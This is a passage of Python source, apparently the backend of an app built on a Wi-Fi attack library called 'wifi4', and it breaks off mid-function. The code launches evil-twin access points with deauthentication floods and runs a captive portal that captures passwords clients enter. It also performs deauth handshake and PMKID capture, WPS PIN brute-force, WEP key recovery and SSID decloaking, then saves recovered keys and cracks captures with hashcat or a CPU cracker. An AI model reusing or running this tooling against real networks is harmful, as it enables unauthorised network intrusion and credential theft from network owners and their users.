    def evil_twin_input(self, ap, options):
        """The TUI modal's output, filled with safe defaults for the app's one-card flow.

        wifi4's EvilTwin TUI asks for a host/punter interface, a BSSID, a channel and which
        eviction frames to send.  The app sends those choices in ``options``; when it does
        not, the first usable member hosts and punts on the target channel, with the twin
        BSSID one above the target's (same-BSSID on the same channel is a collision).
        """
        from wifi4.campaigns.eviltwin import EvilTwinInput, PuntMode, default_punt_modes
        from wifi4.chips.driver import FakeMacSupport
        from wifi4.wlan.array import fake_mac_rank

        options = options or {}
        members = [m for m in (self.array.members if self.array is not None else [])
                   if getattr(m, "driver", None) is not None]
        hosts = [m for m in members
                 if getattr(m.driver, "FAKE_MAC", None) in
                 (FakeMacSupport.SPOOFABLE, FakeMacSupport.FIXED_MAC)]
        if hosts:
            members = hosts
        if not members:
            raise ValueError("EvilTwin needs a live adapter")
        members.sort(key=fake_mac_rank)
        by_name = {str(getattr(m, "name", "") or ""): m for m in members}
        twin = by_name.get(str(options.get("twin_iface") or "")) or members[0]
        punter = by_name.get(str(options.get("punt_iface") or "")) or twin
        single = len(members) == 1
        target_bssid = str(ap.bssid or "").lower()
        bssid = str(options.get("twin_bssid") or "").lower()
        if not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid):
            bssid = ""
        try:
            channel = int(options.get("twin_channel") or ap.channel)
        except (TypeError, ValueError):
            channel = ap.channel
        if single:
            # One radio hosts the twin AND punts for it: it cannot leave the target's channel.
            channel = ap.channel
        else:
            try:
                from wifi4.dot11.chan import is_dfs_channel

                if channel != ap.channel and is_dfs_channel(channel):
                    raise ValueError("DFS channels need the target's own channel")
            except ImportError:  # noqa: PERF203 - the band helper is optional
                pass
        if not bssid or (bssid == target_bssid and channel == ap.channel):
            if not single and bssid:
                raise ValueError("the twin BSSID and channel both match the target: change one")
            last = int(target_bssid[-1], 16)
            bssid = target_bssid[:-1] + format((last + 1) % 16, "x")
        modes = []
        if str(options.get("punt", "auto")) != "none":
            selected = options.get("punt_modes")
            if isinstance(selected, list) and selected:
                wanted = {str(item) for item in selected}
                modes = [mode for mode in PuntMode if mode.name.lower() in wanted]
            else:
                modes = list(default_punt_modes(ap))
        period = options.get("punt_period", 30.0)
        try:
            period = None if period is None else float(period)
        except (TypeError, ValueError):
            period = 30.0
        return EvilTwinInput(twin_iface=twin, punt_iface=punter, twin_channel=channel,
                             twin_bssid=bssid, punt_modes=tuple(modes),
                             punt_period_sec=period,
                             punt_once=bool(options.get("punt_once", False)))

    async def attack(self, kind, bssid, options=None):
        """Runs one wifi4 campaign against one AP, streaming its own status to the app."""
        if self.campaign is not None and not self.campaign.done:
            emit("error", message="an attack is already running")
            return
        kind = str(kind or "")
        classes = self.campaign_classes()
        if kind == "verify":
            verifies = self.verify_classes()
            if not verifies:
                emit("error", message="the wifi4 verify layer is missing from this runtime")
                return
            wanted = str((options or {}).get("verify_type") or "wpa_psk")
            campaign_cls = verifies.get(wanted) or verifies.get("wpa_psk")
        else:
            if not classes:
                emit("error", message="the wifi4 attack layer is missing from this runtime")
                return
            campaign_cls = classes.get(kind)
        if campaign_cls is None:
            emit("error", message=f"unknown attack: {kind}")
            return

        # A scan would hop the radio away mid-campaign: park it on the target first.
        if self.scan_task is not None and not self.scan_task.done():
            await self.stop_scan()
        await self.connect()
        ap = self.ap_for(bssid)
        if ap is None:
            emit("error", message="that network is not in the current scan: scan again, then attack")
            return
        try:
            from wifi4.persist.config import Config

            if Config.is_silenced(ap.bssid):
                emit("error", message="this AP is silenced: unsilence it on the target sheet first")
                return
        except Exception:  # noqa: BLE001 - silencing is optional state, never a blocker
            pass
        try:
            # PBC has no button (visible() is False by design): it is armed by the scanner
            # when the AP's Push-Button window is open.
            if kind == "pbc":
                if not getattr(ap, "wps_pbc_active", False):
                    emit("error", message="WPS Push-Button window is not open")
                    return
            elif kind not in ("eviltwin", "captive", "verify") and not campaign_cls.visible(ap):
                emit("error", message=f"{campaign_cls.idle_label} does not apply to this network")
                return
            reason = campaign_cls.ineligible_reason(ap)
        except Exception as exc:  # noqa: BLE001
            emit("error", message=f"{type(exc).__name__}: {exc}")
            return
        if reason:
            emit("error", message=f"{campaign_cls.idle_label}: {reason}")
            return

        def campaign_log(line):
            text = plain(line)
            if text:
                emit("attack_log", kind=kind, line=text)

        try:
            if kind == "wep":
                campaign = campaign_cls(self.array, ap, log_callback=campaign_log)
            elif kind in ("eviltwin", "captive"):
                evil_options = dict(options or {})
                if kind == "captive":
                    # The portal is host-only: no deauth/punt on a single card, and the captured
                    # M2 is what the password dialog verifies against.
                    evil_options["punt"] = "none"
                evil_input = self.evil_twin_input(ap, evil_options)
                campaign = campaign_cls(self.array, ap, evil_input=evil_input)
            elif kind == "verify":
                value = str((options or {}).get("value") or "")
                if not value:
                    emit("error", message="no saved credential for this network")
                    return
                campaign = campaign_cls(self.array, ap, value, log=campaign_log)
            else:
                campaign = campaign_cls(self.array, ap, log=campaign_log)
            started = campaign.run()
        except Exception as exc:  # noqa: BLE001
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
            return
        if not started:
            emit("error", message="the radio is already busy with another attack")
            return

        self.campaign = campaign
        self.campaign_kind = kind
        self.campaign_ap = ap
        self.captive_psk = ""
        self.campaign_twin_bssid = str(getattr(campaign, "twin_bssid", "") or "").lower()
        self._rate_snapshot = None
        self._rate_at = 0.0
        self.campaign_started = time.monotonic()
        emit("attack_started", kind=kind, label=plain(campaign_cls.button_label(ap)),
             bssid=ap.bssid, ssid=ap.ssid or "", channel=ap.channel)
        self.attack_task = asyncio.create_task(self._watch_campaign(campaign, kind))

    def harvest(self, ap):
        """Saves an AP's live handshakes/PMKIDs to disk, using wifi4's own deduped savers.

        This is what turns an attack's result into a row in the Handshakes screen: the
        campaign fills ``ap.handshakes``, and ``persist.save`` writes one .hc22000 per AP.
        """
        if ap is None or not getattr(ap, "ssid", None):
            return []
        try:
            from wifi4.persist.save import save_handshake, save_pmkid
        except Exception as exc:  # noqa: BLE001
            log(f"cannot import the capture savers: {type(exc).__name__}: {exc}")
            return []
        saved = []
        for client in list((getattr(ap, "handshakes", {}) or {}).keys()):
            for saver in (save_handshake, save_pmkid):
                try:
                    result = saver(ap, client)
                    if result is not None and result.was_new:
                        saved.append(str(result.path))
                except Exception as exc:  # noqa: BLE001 - one odd frame must not stop the attack
                    log(f"{saver.__name__} failed: {type(exc).__name__}: {exc}")
        return saved

    async def _watch_campaign(self, campaign, kind):
        """Ticks the campaign's own status lines to the app, then reports how it ended."""
        while not campaign.done:
            try:
                lines = [plain(line) for line in (campaign.status_headlines(None) or [])]
            except Exception:  # noqa: BLE001 - a status getter must not kill the attack
                lines = []
            try:
                under = plain(campaign.status_under_card() or "")
            except Exception:  # noqa: BLE001
                under = ""
            progress = self.campaign_progress(campaign, kind)
            emit("attack_progress", kind=kind, lines=[line for line in lines if line], under=under,
                 progress=progress)
            try:
                self.harvest(getattr(campaign, "ap", None))
            except Exception:  # noqa: BLE001 - saving must never end the attack
                pass
            await asyncio.sleep(1.0)
        if campaign.stopped:
            await asyncio.sleep(0.1)
        saved = []
        try:
            saved.extend(self.harvest(getattr(campaign, "ap", None)))
            if kind in ("eviltwin", "captive"):
                # The client's M2 lands on the twin's BSSID, not the real AP's row.
                twin = getattr(campaign, "twin_bssid", None)
                if twin and self.array is not None:
                    saved.extend(self.harvest(
                        pool_access_points(self.array).get(str(twin).lower())))
        except Exception:  # noqa: BLE001
            pass
        if saved:
            # A capture the closing sweep just wrote is a capture: the campaign's own flag
            # only counts frames it saw while it was running.
            emit("capture_saved", count=len(saved), paths=saved[:8])
        outcome = self.campaign_outcome(campaign, kind)
        if saved and not outcome.get("ok"):
            outcome["ok"] = True
            outcome["summary"] = "handshake captured"
        self._save_campaign_credentials(campaign, kind, outcome)
        emit("attack_done", kind=kind, stopped=bool(campaign.stopped), **outcome)

    def _save_campaign_credentials(self, campaign, kind, outcome):
        """Persist what the campaign recovered: WPS PIN/PSK, PBC PSK or the WEP key."""
        ap = getattr(campaign, "ap", None) or self.campaign_ap
        if ap is None:
            return
        try:
            from wifi4.persist.save import (save_wep_key, save_wpa_psk, save_wps_pbc,
                                            save_wps_pin)

            saved = []
            if kind == "wps":
                state = getattr(campaign, "state", None)
                pin = getattr(state, "found_pin", None)
                psk = getattr(state, "found_psk", None)
                if pin is not None:
                    result = save_wps_pin(ap, str(pin), psk)
                    if result is not None and result.was_new:
                        saved.append(str(result.path))
                elif psk:
                    result = save_wpa_psk(getattr(ap, "ssid", None),
                                          getattr(ap, "bssid", ""), psk)
                    if result is not None and result.was_new:
                        saved.append(str(result.path))
            elif kind == "pbc":
                psk = getattr(getattr(campaign, "outcome", None), "psk", None)
                if psk:
                    result = save_wps_pbc(ap, psk)
                    if result is not None and result.was_new:
                        saved.append(str(result.path))
            elif kind == "wep":
                key = getattr(campaign, "recovered_key", None)
                if key:
                    result = save_wep_key(ap, key)
                    if result is not None and result.was_new:
                        saved.append(str(result.path))
            if saved:
                emit("capture_saved", count=len(saved), paths=saved)
        except Exception:  # noqa: BLE001 - reporting a win must never crash the attack loop
            log(traceback.format_exc())

    def campaign_outcome(self, campaign, kind):
        """What the card says when a campaign ends: one summary, one detail line."""
        if kind == "deauth":
            captured = bool(getattr(campaign, "captured", False))
            sent = getattr(campaign, "client_sent", 0) or 0
            acked = getattr(campaign, "client_acks", 0) or 0
            broadcast = getattr(campaign, "bcast_sent", 0) or 0
            return {
                "ok": captured,
                # "yet": the passive saver keeps watching and files a handshake that a
                # roaming client produces after the attack stopped.
                "summary": "handshake captured" if captured else "no handshake captured yet",
                "detail": f"deauth {acked}/{sent} acked, {broadcast} broadcast",
            }
        if kind == "pmkid":
            pmkid = getattr(campaign, "pmkid", None)
            if pmkid:
                return {"ok": True, "summary": "PMKID captured", "detail": pmkid.hex()}
            fail_reason = getattr(campaign, "fail_reason", None)
            return {
                "ok": False,
                "summary": "no PMKID",
                "detail": str(getattr(fail_reason, "value", None) or "the AP sent no PMKID"),
            }
        if kind == "wps":
            state = getattr(campaign, "state", None)
            pin = getattr(state, "found_pin", None)
            psk = getattr(state, "found_psk", None)
            if psk:
                detail = f"PSK {psk}" + (f" · PIN {pin}" if pin else "")
                return {"ok": True, "summary": "WPS PSK recovered", "detail": detail,
                        "keys": [psk], "pin": pin or ""}
            if pin:
                return {"ok": True, "summary": "WPS PIN found", "detail": str(pin),
                        "keys": [], "pin": str(pin)}
            tested = getattr(state, "tested", 0) or 0
            phase = str(getattr(state, "phase", "") or "")
            reason = getattr(campaign, "fail_reason", None)
            detail = f"{tested:,} PINs tried" + (f" · phase {phase}" if phase else "")
            if reason:
                # wifi4's own give-up reason ("AP stopped answering M3", "sweep exhausted", …).
                return {"ok": False, "summary": "WPS PIN failed",
                        "detail": f"giving up: {reason} · {detail}", "keys": [], "pin": ""}
            return {"ok": False, "summary": "WPS PIN not found", "detail": detail,
                    "keys": [], "pin": ""}
        if kind == "pbc":
            outcome = getattr(campaign, "outcome", None)
            psk = getattr(outcome, "psk", None) if outcome is not None else None
            detail = (str(getattr(outcome, "detail", "") or "no Push-Button reply")
                      if outcome is not None else
                      str(getattr(campaign, "error", None) or "no Push-Button reply"))
            if psk:
                return {"ok": True, "summary": "WPS PBC PSK recovered", "detail": psk,
                        "keys": [psk]}
            return {"ok": False, "summary": "WPS PBC failed", "detail": detail, "keys": []}
        if kind in ("eviltwin", "captive"):
            captured = bool(getattr(campaign, "captured", False))
            if kind == "captive":
                if self.captive_psk:
                    return {"ok": True, "summary": "Captive portal verified",
                            "detail": f"PSK {self.captive_psk}",
                            "keys": [self.captive_psk]}
                return {"ok": False, "summary": "Captive portal ended",
                        "detail": "no password matched the captured handshake", "keys": []}
            return {"ok": captured,
                    "summary": "Evil Twin captured a handshake" if captured else "Evil Twin stopped",
                    "detail": "crackable M2 saved" if captured else "no client joined the twin",
                    "keys": []}
        if kind in ("decloak", "known_decloak"):
            revealed = getattr(campaign, "revealed", None)
            sent = getattr(campaign, "sent", 0) or 0
            if revealed:
                try:
                    from wifi4.persist.config import Config

                    Config.remember_decloak(getattr(campaign.ap, "bssid", ""), revealed)
                except Exception:  # noqa: BLE001 - the reveal stands even if the memo fails
                    pass
                return {"ok": True, "summary": "SSID revealed", "detail": str(revealed),
                        "ssid": str(revealed), "keys": []}
            return {"ok": False, "summary": "SSID not revealed",
                    "detail": f"no match in {sent} guesses", "keys": []}
        if kind == "verify":
            outcome = getattr(campaign, "outcome", None)
            name = str(getattr(outcome, "name", "") or "") if outcome is not None else ""
            value = str(getattr(campaign, "value", "") or "")
            if name == "VERIFIED":
                return {"ok": True, "summary": "credential verified",
                        "detail": f"the AP accepted {value}", "keys": [value]}
            if name == "REJECTED":
                return {"ok": False, "summary": "credential incorrect",
                        "detail": f"the AP rejected {value}", "keys": []}
            return {"ok": False, "summary": "verification failed",
                    "detail": str(getattr(campaign, "error", None) or "no reply from the AP"),
                    "keys": []}
        if kind == "wep":
            key = getattr(campaign, "recovered_key", None)
            if key:
                text = key.hex()
                if all(0x20 <= b < 0x7F for b in key):
                    text += f' ("{key.decode("ascii")}")'
                return {"ok": True, "summary": "WEP key recovered", "detail": text,
                        "keys": [key.hex()]}
            return {"ok": False, "summary": "no WEP key", "detail": "not enough usable IVs",
                    "keys": []}
        return {"ok": False, "summary": "finished", "detail": "", "keys": []}

    # ---------------------------------------------------- live campaign progress

    def packet_rates(self):
        """Per-second frame rates for the running campaign's AP (wifi4's packet_stats deltas).

        ``inject`` is every injected frame, ``deauth`` the deauth ones, ``eapol`` the EAPOL
        frames heard. This is the same source wifi4's Textual packet dashboard samples, so the
        app's sparkline rises and falls with the radio, not with a timer.
        """
        keys = ("inject", "deauth", "eapol", "beacon", "data")
        snap = {key: 0 for key in keys}
        bssid = getattr(self.campaign_ap, "bssid", "") or ""
        if self.array is not None and bssid:
            try:
                live = self.array.packet_stats.snapshot(bssid)
                for key in keys:
                    snap[key] = int(live.get(key, 0) or 0)
            except Exception as exc:  # noqa: BLE001 - never end an attack over a counter
                log(f"packet stats unavailable: {type(exc).__name__}: {exc}")
        now = time.monotonic()
        previous = self._rate_snapshot
        span = now - self._rate_at if self._rate_at else 0.0
        if previous is None or span <= 0:
            rates = {key: 0 for key in keys}
        else:
            rates = {key: round(max(0, snap[key] - previous.get(key, 0)) / max(span, 0.2), 1)
                     for key in keys}
        self._rate_snapshot = snap
        self._rate_at = now
        return rates, snap

    def campaign_progress(self, campaign, kind):
        """Structured progress for the monitor: stages, metric chips and the rate window.

        Everything here comes from the running campaign's own counters, so a stage is ACTIVE
        because wifi4 is in it, never because a script guessed from a log line.
        """
        rates, totals = self.packet_rates()
        ap = getattr(campaign, "ap", None) or self.campaign_ap
        ssid = getattr(ap, "ssid", "") or ""
        channel = getattr(ap, "channel", 0) or 0
        elapsed = int(max(0.0, time.monotonic() - self.campaign_started)) if self.campaign_started else 0

        def stage(key, label, state, detail=""):
            return {"key": key, "label": label, "state": state, "detail": plain(detail)}

        def metric(key, label, value):
            return {"key": key, "label": label, "value": str(value)}

        stages = [
            stage("radio", "Taking the radio", "done"),
            stage("target", "Locked on the target", "done",
                  f"{ssid or 'hidden'} · CH {channel}" if channel else ssid),
        ]
        metrics = [
            metric("elapsed", "ELAPSED", f"{elapsed // 60:02d}:{elapsed % 60:02d}"),
            metric("inject", "INJECT", f"{rates['inject']:.0f}/s"),
            metric("deauth", "DEAUTH", f"{rates['deauth']:.0f}/s"),
            metric("eapol", "EAPOL", str(totals.get("eapol", 0))),
            metric("clients", "CLIENTS", str(self.ap_clients(getattr(ap, "bssid", "")))),
            metric("beacon", "BEACON", f"{rates['beacon']:.0f}/s"),
        ]

        if kind == "deauth":
            captured = bool(getattr(campaign, "captured", False))
            sent = getattr(campaign, "client_sent", 0) or 0
            acked = getattr(campaign, "client_acks", 0) or 0
            broadcast = getattr(campaign, "bcast_sent", 0) or 0
            csa = getattr(campaign, "csa_sent", 0) or 0
            stages.append(stage("deauth", "Deauthenticating clients",
                                "done" if captured else "active",
                                f"{acked}/{sent} acked · {broadcast} broadcast · {csa} CSA"))
            stages.append(stage("eapol", "Handshake / PMKID",
                                "done" if captured else "active",
                                "capture saved" if captured else "waiting for EAPOL"))
            metrics.append(metric("sent", "FRAMES", sent))
            metrics.append(metric("acked", "ACKED", acked))
        elif kind == "pmkid":
            pmkid = getattr(campaign, "pmkid", None)
            failed = getattr(campaign, "fail_reason", None)
            done = bool(pmkid)
            stages.append(stage("assoc", "Associating with the AP",
                                "done" if done or failed else "active"))
            stages.append(stage("eapol", "Requesting the PMKID",
                                "done" if done else ("failed" if failed else "active"),
                                "PMKID harvested" if done else
                                (str(getattr(failed, "value", failed)) if failed
                                 else "waiting for the association reply")))
        elif kind == "wps":
            state = getattr(campaign, "state", None)
            pin = getattr(state, "found_pin", None)
            tried = getattr(state, "tested", 0) or 0
            phase = str(getattr(state, "phase", "") or "common")
            reason = getattr(campaign, "fail_reason", None)
            done_common = phase != "common" or bool(pin)
            stages.append(stage("assoc", "Associating with the AP", "done"))
            stages.append(stage("pixie", "Pixie-dust + default PINs",
                                "done" if done_common else "active",
                                f"{tried:,} PINs tried" if not done_common else "swept"))
            if pin:
                sweep_state, sweep_detail = "done", f"PIN {pin}"
            elif reason:
                sweep_state, sweep_detail = "failed", f"giving up: {reason}"
            else:
                sweep_state, sweep_detail = "active", f"{min(tried, 11000):,}/11,000"
            stages.append(stage("sweep", "11k PIN sweep", sweep_state, sweep_detail))
            metrics.append(metric("tried", "PINs TRIED", f"{tried:,}"))
            metrics.append(metric("phase", "PHASE", phase))
            if pin:
                metrics.append(metric("pin", "PIN", pin))
        elif kind == "pbc":
            outcome = getattr(campaign, "outcome", None)
            psk = getattr(outcome, "psk", None) if outcome is not None else None
            failed = getattr(campaign, "error", None) is not None
            stages.append(stage("assoc", "Joining the Push-Button window",
                                "done" if outcome is not None else "active"))
            stages.append(stage("wps", "WPS PBC exchange",
                                "done" if psk else ("failed" if failed else "active"),
                                f"PSK {psk}" if psk else "waiting for M7"))
        elif kind in ("decloak", "known_decloak"):
            revealed = getattr(campaign, "revealed", None)
            sent = getattr(campaign, "sent", 0) or 0
            planned = getattr(campaign, "planned", 0) or 0
            stages.append(stage("probe", "Probing the hidden AP",
                                "done" if revealed else "active",
                                f"{sent}/{planned} sent" if planned else f"{sent} sent"))
            stages.append(stage("ssid", "SSID revealed",
                                "done" if revealed else "pending",
                                str(revealed or "waiting for the AP to name itself")))
        elif kind == "verify":
            step = str(getattr(campaign, "step", "") or "")
            outcome = getattr(campaign, "outcome", None)
            if outcome is None:
                stages.append(stage("assoc", "Joining the AP", "active", step))
                stages.append(stage("verify", "Checking the credential", "pending"))
            else:
                ok = str(getattr(outcome, "name", "") or "") == "VERIFIED"
                stages.append(stage("assoc", "Joining the AP", "done", step))
                stages.append(stage("verify", "Checking the credential",
                                    "done" if ok else "failed",
                                    str(getattr(campaign, "error", None) or "")))
        elif kind == "wep":
            key = getattr(campaign, "recovered_key", None)
            samples = 0
            try:
                samples = self.array.wep_store.crack_sample_count(
                    getattr(ap, "bssid", "")) if self.array is not None else 0
            except Exception:  # noqa: BLE001 - a dashboard number must not break progress
                samples = 0
            from wifi4.crack.wep import CRACK_READY_THRESHOLD

            stages.append(stage("ivs", "Collecting usable IVs",
                                "done" if key else "active",
                                f"{samples:,}/{CRACK_READY_THRESHOLD:,}"))
            stages.append(stage("crack", "PTW key recovery",
                                "done" if key else "active",
                                f"key {key.hex()}" if key else "waiting for enough IVs"))
            metrics.append(metric("ivs", "USABLE IVS", f"{samples:,}"))

        stages.append(stage("save", "Saving the capture", "pending"))
        return {"stages": stages, "metrics": metrics, "rates": rates,
                "elapsed": elapsed, "window": 1}

    # ------------------------------------------------------ captures and cracking

    @staticmethod
    def capture_path(name):
        """The one capture file called ``name`` in the capture directory, or None.

        A name, never a path: the app cannot ask the engine to read anything outside its own
        captures directory.
        """
        if not name:
            return None
        candidate = captures_dir() / Path(str(name)).name
        return candidate if candidate.is_file() else None

    @staticmethod
    def capture_keys(path):
        """The PSKs already recovered for this capture file (one per line, ``.psk`` sidecar)."""
        sidecar = Path(str(path) + ".psk")
        try:
            return [line.strip() for line in sidecar.read_text("utf-8").splitlines() if line.strip()]
        except OSError:
            return []

    @staticmethod
    def save_capture_keys(path, keys):
        if not keys:
            return
        try:
            Path(str(path) + ".psk").write_text("\n".join(dict.fromkeys(keys)) + "\n",
                                                encoding="utf-8")
        except OSError as exc:
            log(f"cannot save the recovered key: {exc}")

    def capture_entries(self):
        """Every saved .hc22000 as the Handshakes screen draws it: hash type, AP, size, keys."""
        from wifi4.crack.hc22000_format import read_hc22000

        entries = []
        root = captures_dir()
        if not root.is_dir():
            return entries
        for path in sorted(root.glob("*.hc22000")):
            try:
                lines = read_hc22000(str(path))
            except Exception as exc:  # noqa: BLE001 - one unreadable file must not blank the list
                log(f"cannot read {path.name}: {type(exc).__name__}: {exc}")
                continue
            if not lines:
                continue
            first = lines[0][1]
            ssid = ""
            try:
                ssid = bytes.fromhex(first.essid).decode("utf-8", "replace")
            except (ValueError, AttributeError):
                ssid = getattr(first, "ssid", "") or ""
            pmkid = any(line.is_pmkid for _, line in lines)
            try:
                size = path.stat().st_size
                when = int(path.stat().st_mtime)
            except OSError:
                size, when = 0, 0
            keys = self.capture_keys(path)
            entries.append({
                "id": path.name,
                "ssid": ssid,
                "bssid": getattr(first, "bssid", "") or "",
                "kind": "pmkid" if pmkid else "handshake",
                "lines": len(lines),
                "size": size,
                "when": when,
                "keys": keys,
            })
        entries.sort(key=lambda entry: entry["when"], reverse=True)
        return entries

    def credential_entries(self):
        """Recovered credentials wifi4's own savers wrote beside the captures.

        WPS PIN/PBC, WPA PSK and WEP key files are plain text (wifi4's format), so the app can
        show and copy them without a second database. They are what the desktop Vault keeps.
        """
        entries = []
        root = captures_dir()
        if not root.is_dir():
            return entries
        kinds = {"_wps_pin.txt": "wps_pin", "_wps_pbc.txt": "wps_pbc",
                 "_wpa_psk.txt": "wpa_psk", "_wep_key.txt": "wep"}
        for path in sorted(root.glob("*.txt")):
            kind = next((value for suffix, value in kinds.items()
                         if path.name.endswith(suffix)), None)
            if kind is None:
                continue
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue

            def field(name):
                match = re.search(rf"^{re.escape(name)}:\s*(.*)$", text, re.MULTILINE)
                return match.group(1).strip() if match else ""

            if kind == "wep":
                value = field("WEP key (hex)")
                pin = ""
            else:
                value = field("PSK")
                pin = field("PIN")
            if not value and not pin:
                continue
            try:
                when = int(path.stat().st_mtime)
            except OSError:
                when = 0
            entries.append({
                "id": path.name, "ssid": field("SSID"),
                "bssid": field("BSSID"), "kind": kind,
                "value": value, "pin": pin, "when": when,
            })
        entries.sort(key=lambda entry: entry["when"], reverse=True)
        return entries

    async def captures(self):
        """Lists the saved handshakes/PMKIDs and recovered keys the app shows."""
        try:
            entries = await asyncio.to_thread(self.capture_entries)
            credentials = await asyncio.to_thread(self.credential_entries)
        except Exception as exc:  # noqa: BLE001
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
            return
        cracked = sum(1 for entry in entries if entry["keys"])
        total_bytes = sum(entry["size"] for entry in entries)
        emit("captures", captures=entries, count=len(entries), cracked=cracked,
             bytes=total_bytes, directory=str(captures_dir()),
             credentials=credentials, credential_count=len(credentials))

    def crack_tools(self):
        """Which wifi4 cracking tools this runtime can actually start.

        CPU crack ships with wifi4 (pure Python) and always works. Hashcat is optional: it is
        offered only when an executable is configured or on the runtime's PATH, never as a
        button that cannot run. ``default_passwords`` reports the package-data list the switch
        covers, so a runtime built without it is visible instead of silently weaker.
        """
        default_list = default_passwords_info()
        tools = [{
            "tool": "cpu_crack",
            "label": "CPU Crack",
            "available": True,
            "reason": "",
            "description": "Built-in CPU cracker (WPA/WPA2/PMKID)",
            "default_passwords": default_list,
        }]
        executable = ""
        try:
            from wifi4.persist.config import Config

            executable = Config.hashcat.path or ""
        except Exception:  # noqa: BLE001
            executable = ""
        if not executable:
            executable = shutil.which("hashcat") or ""
        tools.append({
            "tool": "hashcat",
            "label": "Hashcat (GPU)",
            "available": bool(executable),
            "reason": "" if executable else "hashcat is not installed in this runtime",
            "description": "Advanced password recovery (WPA/WPA2/PMKID)",
            "default_passwords": default_list,
        })
        return tools

    async def tool_list(self):
        emit("crack_tools", tools=self.crack_tools())

    async def crack(self, name, tool="cpu_crack", wordlists=None, default_passwords=True,
                    ssid_passwords=True, probed_ssids=False):
        """Runs one wifi4 cracking tool over one saved capture, streaming its own progress."""
        if self.crack_task is not None and not self.crack_task.done():
            emit("error", message="a crack is already running")
            return
        path = self.capture_path(name)
        if path is None:
            emit("error", message=f"capture not found: {name}")
            return
        from wifi4.crack.hc22000_format import read_hc22000
        from wifi4.models import CaptureType, PersistedCapture
        from wifi4.models.jobs import JobState, ToolName, ToolStatus

        try:
            lines = read_hc22000(str(path))
        except Exception as exc:  # noqa: BLE001
            emit("error", message=f"cannot read {name}: {type(exc).__name__}: {exc}")
            return
        if not lines:
            emit("error", message=f"{name} holds no hashlines")
            return
        first = lines[0][1]
        ssid = ""
        try:
            ssid = bytes.fromhex(first.essid).decode("utf-8", "replace")
        except (ValueError, AttributeError):
            ssid = getattr(first, "ssid", "") or ""
        capture = PersistedCapture(
            type=CaptureType.PMKID if any(line.is_pmkid for _, line in lines) else CaptureType.HS,
            timestamp=int(path.stat().st_mtime), path=str(path),
            bssid=getattr(first, "bssid", "") or "", ssid=ssid)

        wordlists = [str(item) for item in (wordlists or []) if str(item)]
        extra_passwords = []
        if probed_ssids and self.array is not None:
            extra_passwords = sorted(getattr(self.array, "probed_ssids", set()) or ())
        if tool == "hashcat":
            from wifi4.vault.tools.hashcat import HashcatTool

            executable = ""
            try:
                from wifi4.persist.config import Config

                executable = Config.hashcat.path or ""
            except Exception:  # noqa: BLE001
                executable = ""
            executable = executable or shutil.which("hashcat") or ""
            if not executable:
                emit("error", message="hashcat is not installed in this runtime")
                return
            cracker = HashcatTool()
            config = {"hashcat_exe": executable, "wordlists": wordlists,
                      "default_passwords": bool(default_passwords),
                      "ap_ssid_passwords": bool(ssid_passwords),
                      "probed_ssid_passwords": bool(probed_ssids),
                      "extra_passwords": extra_passwords}
            tool_name = ToolName.HASHCAT
        else:
            from wifi4.vault.tools.cpu_crack import CpuCrackTool

            cracker = CpuCrackTool()
            config = {"wordlists": wordlists, "default_passwords": bool(default_passwords),
                      "ap_ssid_passwords": bool(ssid_passwords),
                      "probed_ssid_passwords": bool(probed_ssids),
                      "extra_passwords": extra_passwords}
            tool_name = ToolName.CPU_CRACK

        job_id = f"{tool_name}_{path.stem}_{int(time.time())}"
        job = JobState(job_id=job_id, tool_name=tool_name, capture_path=str(path),
                       hashlines_path=str(path), status=ToolStatus.QUEUED,
                       progress_msg="Starting...", config=config)
        try:
            await asyncio.to_thread(cracker.launch, job, capture)
        except Exception as exc:  # noqa: BLE001
            detail = traceback.format_exc()
            log(detail)
            emit("error", message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
            return
        self.crack_tool = cracker
        self.crack_job = job
        self.crack_capture = path.name
        self.crack_ssid = ssid
        self.crack_bssid = getattr(first, "bssid", "") or ""
        emit("crack_started", capture=path.name, tool=str(tool_name), ssid=ssid)
        self.crack_task = asyncio.create_task(self._watch_crack())

    async def _watch_crack(self):
        """Polls the tool's own progress and reports how the crack ended."""
        from wifi4.models.jobs import JobAction, ToolStatus

        tool, job = self.crack_tool, self.crack_job
        path = self.capture_path(self.crack_capture)
        result = None
        while True:
            try:
                result = await asyncio.to_thread(tool.poll_status, job)
            except Exception as exc:  # noqa: BLE001
                detail = traceback.format_exc()
                log(detail)
                emit("crack_done", capture=self.crack_capture, ok=False, keys=[],
                     message=f"{type(exc).__name__}: {exc}", detail=detail.strip())
                return
            keys = list(getattr(result, "keys", ()) or ())
            percent = getattr(result, "percent", None)
            emit("crack_progress", capture=self.crack_capture, percent=percent,
                 message=plain(result.value or ""), detail=plain(getattr(result, "detail", "")),
                 keys=keys, stoppable=bool(getattr(result, "actions", JobAction.NONE) & JobAction.STOP))
            if result.status is not ToolStatus.RUNNING:
                break
            await asyncio.sleep(1.0)
        keys = list(getattr(result, "keys", ()) or ())
        if path is not None:
            self.save_capture_keys(path, keys)
        if keys:
            try:
                from wifi4.persist.save import save_wpa_psk

                save_wpa_psk(self.crack_ssid, self.crack_bssid, keys[0])
            except Exception:  # noqa: BLE001 - the sidecar above already kept the key
                log(traceback.format_exc())
        emit("crack_done", capture=self.crack_capture,
             ok=bool(keys) or result.status is ToolStatus.SUCCESS,
             status=str(getattr(result.status, "value", result.status)), keys=keys,
             message=plain(result.value or ""), detail=plain(getattr(result, "detail", "")))
        if path is not None:
            await self.captures()

    async def stop_crack(self):
        """Stops the running crack through the tool's own stop action."""
        from wifi4.models.jobs import JobAction

        if self.crack_job is None or self.crack_tool is None:
            emit("crack_stopped")
            return
        try:
            self.crack_tool.apply(JobAction.STOP, self.crack_job)
            emit("crack_stopping", capture=self.crack_capture)
        except Exception as exc:  # noqa: BLE001
            emit("error", message=f"cannot stop the crack: {type(exc).__name__}: {exc}")

    async def verify_psk(self, bssid, psk):
        """Checks a candidate passphrase against the AP's captured hashlines.

        This is the verification half of the captive-portal flow: the fake AP captures an M2,
        the caller submits the password a client entered, and ``psk_verdict`` proves whether
        that password produced the captured MIC.  A match is saved as a recovered PSK and, while
        the portal campaign is running, stops it.
        """
        from wifi4.crack.hc22000_format import read_hc22000
        from wifi4.crack.wpa_psk import psk_verdict
        from wifi4.persist.save import save_wpa_psk

